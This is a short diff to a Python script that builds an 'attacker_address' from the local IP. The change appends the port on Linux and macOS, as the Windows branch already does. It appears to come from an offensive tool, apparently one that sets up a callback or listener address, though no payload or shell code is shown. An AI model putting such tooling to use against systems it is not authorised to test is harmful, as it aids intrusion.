@@ -46,7 +46,7 @@ if "-i" in sys.argv or "--ip" in sys.argv:
         ssh_address = input("SSH Server Address >> ")
 else:
     if sys.platform[:5] == "linux" or sys.platform == "darwin":
-        attacker_address = os.popen("ip route").read().split("src ")[1].split(" ")[0]
+        attacker_address = os.popen("ip route").read().split("src ")[1].split(" ")[0] + ":" + str(port)
     elif sys.platform == "win32":
         ipconfig = os.popen("ipconfig").readlines()
         attacker_address = [x.split(": ")[1].strip() for x in ipconfig if "IPv4" in x][0] + ":" + str(port)
